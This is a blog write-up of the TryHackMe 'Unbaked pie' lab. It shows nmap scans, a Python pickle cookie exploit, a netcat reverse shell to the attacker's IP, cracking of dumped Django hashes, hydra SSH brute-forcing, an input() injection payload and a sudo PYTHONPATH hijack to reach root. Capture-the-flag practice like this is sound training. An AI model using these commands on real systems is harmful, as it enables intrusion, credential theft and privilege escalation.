---
layout: post
title:  "TryHackMe Unbaked pie writeup"
date:   2020-12-08 12:59:36 +0200
categories: writeup tryhackme
---

This is a writeup for TryHackMe room [Unbaked pie](https://tryhackme.com/room/unbakedpie). 

Start with nmap scan. Target seems to be blocking ping probes so let’s disable host discovery.

```bash=
nmap -Pn 10.10.106.195            
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-08 20:45 EET
Nmap scan report for 10.10.106.195
Host is up (0.053s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE
5003/tcp open  filemaker
Nmap done: 1 IP address (1 host up) scanned in 69.44 seconds
```
Looking at the website at the single open port there are tasty recipes that hint to Python Pickle deserialization vulnerability.
![](https://i.imgur.com/e8CAVah.png)
Enumerating the site I can confirm that there is a Pickled cookie in the search functionality:

![](https://i.imgur.com/yoH1fyz.png)


I test that exploiting this works and yes. I can create files in the local file system and serve them over HTTP. I then create a Python exploit to easily run commands on the server:

{% gist 024c29c2b7128d23e7f9487aa7df5bf7 %}

After looking for flags etc. for a while I decide that it’s time for a reverse shell. I set up a local listener with nc and run the exploit:

```bash=
python3 exploit.py http://10.10.106.195:5003 "/bin/nc -e /bin/sh 10.8.108.247 4444 "
```
Enumerating the host we can dump Django credentials from /home/site/db.sqlite3:
![](https://i.imgur.com/2xhwnUt.png)

```bash=
hashcat -m 10000 hashes /usr/share/wordlists/rockyou.txt
```

Since Django hashes are pbkdf2 hashed it’s gonna be a while so I keep enumerating while I wait. Another interesting finding in /root/.bash_history shows that someone has been making SSH connections as ramsey from this box:

```bash
ssh ramsey@172.17.0.1
ssh ramsey@172.17.0.1
ssh ramsey@172.17.0.1
```

I upload a statically linked version of nmap and execute a scan. Looking at the probable docker host there is only SSH port open:

```
nmap 172.17.0.1
starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-12-08 18:23 UTC
Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Host is up (0.000011s latency).
Not shown: 1206 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:99:95:76:1E (Unknown)
Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds
```
Let’s connect to that using ramsey’s password. But oh no, evil admin has removed ssh and there is no Internet connectivity! Not to worry, set up a local proxy server (I used Burp suite) and configure apt to use proxy:

```
echo 'Acquire::http::Proxy "http://10.8.108.247:8080/";' > /etc/apt/apt.conf.d/proxy.conf
```
Then install openssh back:

```
apt --fix-broken install
apt install openssh-client
```
No luck with hashcat so far so what if I try hydra from the docker guest? I install it with apt-get and also download rockyou.txt. I could have set up a tunnel for less noisy approach but maybe next time.

```
hydra -l ramsey -P rockyou.txt 172.17.0.1 ssh
 hydra -l ramsey -P rockyou.txt 172.17.0.1 ssh
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-08 19:26:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.1:22/
[22][ssh] host: 172.17.0.1   login: ramsey   password: __REDACTED__
1 of 1 target successfully completed, 1 valid password found
```
# Enumerating Docker host

We know the password so let’s start with sudo:

```bash=
sudo -l
[sudo] password for ramsey:
Matching Defaults entries for ramsey on unbaked:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User ramsey may run the following commands on unbaked:
    (oliver) /usr/bin/python /home/ramsey/vuln.py
```

Looking at the vuln.py code there seems to a vulnerability in using input() so let’s abuse that and land a shell as oliver:

```bash=
Enter Options >> __import__(‘os’).system(‘/bin/bash’)
$ id
uid=1002(oliver) gid=1002(oliver) groups=1002(oliver),1003(sysadmin)
```

the difference beween ramsey and oliver seems to be the group membership. Let’s figure out what sysadmins can do:

```bash
find / -group sysadmin 2>/dev/null
/opt/dockerScript.py
cat dockerScript.py
import docker
# oliver, make sure to restart docker if it crashes or anything happened.
# i havent setup swap memory for it
# it is still in development, please dont let it live yet!!!
client = docker.from_env()
client.containers.run("python-django:latest", "sleep infinity", detach=True)
```

ok cool. Let’s check sudo -l even though we don’t have the password:

```bash=
sudo -l
Matching Defaults entries for oliver on unbaked:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User oliver may run the following commands on unbaked:
    (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
```

When we control the environment, we can set the Python path and use it to exploit by loading Docker.py (create to /tmp):

```python=
import os
os.system("/bin/bash")
```
Now run the script with PYTHONPATH set:
```bash=
sudo PYTHONPATH=/tmp /usr/bin/python /opt/dockerScript.py
```
And BOOM we are root! Thanks for the great box. Lot’s of fun Python stuff to abuse.
